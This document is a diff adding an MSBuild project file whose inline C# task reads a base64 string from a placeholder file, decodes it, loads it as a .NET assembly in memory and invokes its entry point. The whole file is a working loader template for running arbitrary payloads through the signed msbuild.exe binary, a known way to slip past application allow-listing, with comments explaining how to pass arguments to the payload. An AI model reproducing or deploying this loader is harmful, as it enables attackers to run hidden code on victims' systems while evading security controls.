@@ -1,0 +1,53 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+	  <Target Name="Hello">
+	    <ClassExample />
+	  </Target>
+	  <UsingTask
+	    TaskName="ClassExample"
+	    TaskFactory="CodeTaskFactory"
+	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	    <Task>
+	    
+	      <Code Type="Class" Language="cs">
+	      <![CDATA[
+		using System;
+		using System.Reflection;
+		using System.Collections.Generic;
+		using System.Text;
+		using System.IO;
+		using System.Net;
+		using System.Runtime.InteropServices;
+		using Microsoft.Build.Framework;
+		using Microsoft.Build.Utilities;
+		public class ClassExample :  Task, ITask
+		{
+			public override bool Execute()
+		   {
+		     Console.WriteLine("Hello");
+			 string s = System.IO.File.ReadAllText(@"CHANGEME.txt");
+			 Console.WriteLine("Got String");
+			 byte[] b = System.Convert.FromBase64String(s);
+			 Console.WriteLine("Convert From b64");
+			 System.Reflection.Assembly a = System.Reflection.Assembly.Load(b);
+			 Console.WriteLine("Load Assembly");
+			 System.Reflection.MethodInfo method = a.EntryPoint;
+			 Console.WriteLine("Get Entry Point");
+			 Console.WriteLine(method);
+			 
+			 //Below Two lines get commented if args needed
+			 object o = a.CreateInstance(method.Name);
+             method.Invoke(o, null);
+			 
+			 //If Args are required uncomment below two lines and comment above line
+			 //string[] args1 = new string[] { "BasicOSInfo" };
+             //a.EntryPoint.Invoke(null, new object[] { args1 });
+			 
+			 return true;
+		   }
+		}     
+	      ]]>
+	      </Code>
+	    </Task>
+	  </UsingTask>
+	</Project>
